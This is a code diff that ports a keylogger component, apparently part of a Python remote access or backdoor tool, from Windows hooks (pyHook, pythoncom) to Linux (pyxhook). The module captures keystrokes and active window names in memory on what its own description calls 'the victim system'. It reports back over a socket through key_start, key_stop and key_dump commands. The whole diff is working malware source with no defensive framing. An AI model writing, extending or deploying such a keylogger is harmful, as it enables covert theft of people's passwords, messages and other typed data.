@@ -6,10 +6,9 @@ config.main()
 
 def main(option):
     if option == 'generate':
-        config.import_statements.append('import pyHook')
-        config.import_statements.append('import pythoncom')
+        config.import_statements.append('import pyxhook')
         config.import_statements.append('import threading')
-        config.import_statements.append('from ctypes import windll')
+        config.import_statements.append('from time import sleep')
         config.global_vars.append('keylog = ""')
         config.global_vars.append('window = ""')
         config.global_vars.append('active_logger = False')
@@ -38,18 +37,18 @@ def key(option):
         if active_logger:
             s.sendall('[-]Keylogger already started')
         else:
-            hooks_manager = pyHook.HookManager()
+            hooks_manager = pyxhook.HookManager()
             hooks_manager.KeyDown = OnKeyboardEvent
             hooks_manager.HookKeyboard()
+            hooks_manager.start()
             active_logger = not active_logger
             s.sendall('[+]Activated keylogger')
             while True:
                 if not active_logger:
-                    hooks_manager.UnhookKeyboard()
-                    windll.user32.PostQuitMessage(0)
+                    hooks_manager.cancel()
                     return
                 else:
-                    pythoncom.PumpWaitingMessages()
+                    sleep(1)
     elif option == 'key_stop':
         if not active_logger:
             s.sendall('[-]Keylogger not started')
@@ -68,7 +67,7 @@ def key(option):
         config.help_menu['key_dump'] = 'Dump the captured in-memory keystrokes'
     elif option == 'info':
         print '\nName             : Keylogger and window logger component' \
-              '\nOS               : Windows' \
-              '\nRequired Modules : PyHook (External), pythoncom (External), threading, ctypes' \
+              '\nOS               : Linux' \
+              '\nRequired Modules : pyxhook (External)' \
               '\nCommands         : key_start, key_stop, key_dump' \
               '\nDescription      : Runs a keylogger on the victim system which logs in-memory also logs which windows it is captured in, to view the log run the key_dump command\n'
